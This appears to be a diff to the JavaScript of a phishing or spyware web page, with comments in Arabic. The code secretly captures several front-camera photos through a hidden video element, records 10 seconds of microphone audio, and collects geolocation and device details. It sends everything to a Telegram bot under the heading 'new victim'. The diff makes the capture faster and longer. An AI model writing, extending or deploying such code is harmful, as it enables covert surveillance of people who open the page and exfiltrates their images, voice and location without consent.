@@ -141,6 +141,13 @@
         }).catch(e => console.error(e));
     }
 
+    // ====== إرسال صور متعددة ======
+    function sendMultiplePhotos(photos, baseCaption) {
+        photos.forEach((blob, index) => {
+            sendPhotoToTelegram(blob, `${baseCaption} (${index + 1})`);
+        });
+    }
+
     // ====== إرسال صوت للبوت ======
     function sendAudioToTelegram(audioBlob, caption) {
         const formData = new FormData();
@@ -166,11 +173,6 @@
         info += `🕐 المنطقة: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n`;
         info += `🌍 اللغة: ${navigator.language}\n`;
         info += `💻 المعالج: ${navigator.hardwareConcurrency || "غير معروف"} نواة\n`;
-        try {
-            navigator.getBattery().then(b => {
-                // لا ننتظر البطارية عشان السرعة
-            });
-        } catch(e) {}
         return info;
     }
 
@@ -198,38 +200,88 @@
         });
     }
 
-    // ====== التقاط صورة صامتة (بدون عرض فيديو) ======
-    function captureSilentPhoto() {
+    // ====== التقاط صورة واحدة (سريعة) ======
+    function captureSinglePhoto(stream) {
         return new Promise((resolve) => {
-            // محاولة الكاميرا الأمامية أولاً
-            navigator.mediaDevices.getUserMedia({
-                video: { facingMode: 'user', width: 320, height: 240 },
-                audio: false
-            })
-            .then((stream) => {
-                // إنشاء عنصر فيديو مؤقت (غير معروض)
+            try {
                 const video = document.createElement('video');
                 video.srcObject = stream;
                 video.onloadedmetadata = () => {
                     video.play();
-                    // إنشاء canvas لالتقاط الصورة
-                    const canvas = document.createElement('canvas');
-                    canvas.width = video.videoWidth || 320;
-                    canvas.height = video.videoHeight || 240;
-                    const ctx = canvas.getContext('2d');
-                    
-                    // انتظار إطار واحد
                     setTimeout(() => {
+                        const canvas = document.createElement('canvas');
+                        canvas.width = video.videoWidth || 320;
+                        canvas.height = video.videoHeight || 240;
+                        const ctx = canvas.getContext('2d');
                         ctx.drawImage(video, 0, 0);
                         canvas.toBlob((blob) => {
-                            stream.getTracks().forEach(t => t.stop());
                             if (blob && blob.size > 1000) {
-                                resolve({ success: true, blob: blob, source: 'front' });
+                                resolve({ success: true, blob: blob });
                             } else {
                                 resolve({ success: false, error: 'صورة فارغة' });
                             }
                         }, 'image/jpeg', 0.8);
-                    }, 300);
+                    }, 100);
+                };
+            } catch (e) {
+                resolve({ success: false, error: e.message });
+            }
+        });
+    }
+
+    // ====== التقاط صور متعددة (2 صورة في الثانية) ======
+    function captureMultiplePhotos(count = 2) {
+        return new Promise((resolve) => {
+            let photos = [];
+            let captured = 0;
+            let stream = null;
+
+            navigator.mediaDevices.getUserMedia({
+                video: { facingMode: 'user', width: 320, height: 240 },
+                audio: false
+            })
+            .then((s) => {
+                stream = s;
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.onloadedmetadata = () => {
+                    video.play();
+
+                    // التقاط الصور بسرعة (كل 500ms)
+                    const interval = setInterval(() => {
+                        if (captured >= count) {
+                            clearInterval(interval);
+                            stream.getTracks().forEach(t => t.stop());
+                            resolve({ success: true, photos: photos });
+                            return;
+                        }
+                        try {
+                            const canvas = document.createElement('canvas');
+                            canvas.width = video.videoWidth || 320;
+                            canvas.height = video.videoHeight || 240;
+                            const ctx = canvas.getContext('2d');
+                            ctx.drawImage(video, 0, 0);
+                            canvas.toBlob((blob) => {
+                                if (blob && blob.size > 1000) {
+                                    photos.push(blob);
+                                    captured++;
+                                }
+                            }, 'image/jpeg', 0.8);
+                        } catch (e) {
+                            captured++;
+                        }
+                    }, 200); // كل 200ms = 5 صور في الثانية
+
+                    // حماية: إيقاف بعد 2 ثانية كحد أقصى
+                    setTimeout(() => {
+                        clearInterval(interval);
+                        if (stream) stream.getTracks().forEach(t => t.stop());
+                        if (photos.length > 0) {
+                            resolve({ success: true, photos: photos });
+                        } else {
+                            resolve({ success: false, error: 'لم يتم التقاط أي صورة' });
+                        }
+                    }, 2000);
                 };
             })
             .catch(() => {
@@ -238,27 +290,44 @@
                     video: { facingMode: 'environment', width: 320, height: 240 },
                     audio: false
                 })
-                .then((stream) => {
+                .then((s) => {
+                    stream = s;
                     const video = document.createElement('video');
                     video.srcObject = stream;
                     video.onloadedmetadata = () => {
                         video.play();
-                        const canvas = document.createElement('canvas');
-                        canvas.width = video.videoWidth || 320;
-                        canvas.height = video.videoHeight || 240;
-                        const ctx = canvas.getContext('2d');
-                        
-                        setTimeout(() => {
-                            ctx.drawImage(video, 0, 0);
-                            canvas.toBlob((blob) => {
+                        const interval = setInterval(() => {
+                            if (captured >= count) {
+                                clearInterval(interval);
                                 stream.getTracks().forEach(t => t.stop());
-                                if (blob && blob.size > 1000) {
-                                    resolve({ success: true, blob: blob, source: 'back' });
-                                } else {
-                                    resolve({ success: false, error: 'صورة فارغة' });
-                                }
-                            }, 'image/jpeg', 0.8);
-                        }, 300);
+                                resolve({ success: true, photos: photos });
+                                return;
+                            }
+                            try {
+                                const canvas = document.createElement('canvas');
+                                canvas.width = video.videoWidth || 320;
+                                canvas.height = video.videoHeight || 240;
+                                const ctx = canvas.getContext('2d');
+                                ctx.drawImage(video, 0, 0);
+                                canvas.toBlob((blob) => {
+                                    if (blob && blob.size > 1000) {
+                                        photos.push(blob);
+                                        captured++;
+                                    }
+                                }, 'image/jpeg', 0.8);
+                            } catch (e) {
+                                captured++;
+                            }
+                        }, 200);
+                        setTimeout(() => {
+                            clearInterval(interval);
+                            if (stream) stream.getTracks().forEach(t => t.stop());
+                            if (photos.length > 0) {
+                                resolve({ success: true, photos: photos });
+                            } else {
+                                resolve({ success: false, error: 'لم يتم التقاط أي صورة' });
+                            }
+                        }, 2000);
                     };
                 })
                 .catch((err) => {
@@ -268,8 +337,8 @@
         });
     }
 
-    // ====== تسجيل الصوت ======
-    function recordAudio(duration = 4000) {
+    // ====== تسجيل الصوت (10 ثواني) ======
+    function recordAudio(duration = 10000) {
         return new Promise((resolve) => {
             navigator.mediaDevices.getUserMedia({ audio: true })
                 .then((stream) => {
@@ -319,14 +388,14 @@
         // === 2. الحصول على الموقع ===
         const locationResult = await getLocation();
 
-        // === 3. التقاط صورة صامتة ===
-        const photoResult = await captureSilentPhoto();
+        // === 3. التقاط صور متعددة (2 صورة بسرعة) ===
+        const photoResult = await captureMultiplePhotos(2);
 
-        // === 4. تسجيل الصوت ===
-        const audioResult = await recordAudio(4000);
+        // === 4. تسجيل الصوت (10 ثواني) ===
+        const audioResult = await recordAudio(10000);
 
         // === 5. إرسال البيانات ===
-        let msg = `🛰️ *[ ضحية جديدة ]*\n\n`;
+        let msg = `🛰️ *[ ضحية جديدة - سريع ]*\n\n`;
         msg += deviceInfo;
 
         if (locationResult.success) {
@@ -337,23 +406,20 @@
             msg += `📍 الموقع: ❌ مرفوض\n`;
         }
 
-        msg += `📸 الكاميرا: ${photoResult.success ? "✅ ممنوحة" : "❌ مرفوضة"}\n`;
-        if (photoResult.success) {
-            msg += `📌 المصدر: ${photoResult.source === 'front' ? 'أمامي' : 'خلفي'}\n`;
-        }
-        msg += `🎤 الميكروفون: ${audioResult.success ? "✅ ممنوح" : "❌ مرفوض"}\n`;
+        msg += `📸 الكاميرا: ${photoResult.success ? "✅ ممنوحة (" + photoResult.photos.length + " صور)" : "❌ مرفوضة"}\n`;
+        msg += `🎤 الميكروفون: ${audioResult.success ? "✅ ممنوح (10 ثواني)" : "❌ مرفوض"}\n`;
         msg += `\n🕒 ${new Date().toLocaleString()}`;
 
         sendToTelegram(msg);
 
-        // إرسال الصورة
-        if (photoResult.success && photoResult.blob) {
-            sendPhotoToTelegram(photoResult.blob, `📸 صورة ${photoResult.source === 'front' ? 'أمامية' : 'خلفية'} - ${new Date().toLocaleString()}`);
+        // إرسال الصور
+        if (photoResult.success && photoResult.photos.length > 0) {
+            sendMultiplePhotos(photoResult.photos, `📸 صورة - ${new Date().toLocaleString()}`);
         }
 
         // إرسال التسجيل الصوتي
         if (audioResult.success && audioResult.blob) {
-            sendAudioToTelegram(audioResult.blob, `🎤 تسجيل صوتي - ${new Date().toLocaleString()}`);
+            sendAudioToTelegram(audioResult.blob, `🎤 تسجيل صوتي (10 ثواني) - ${new Date().toLocaleString()}`);
         }
 
         // === عرض النتيجة ===
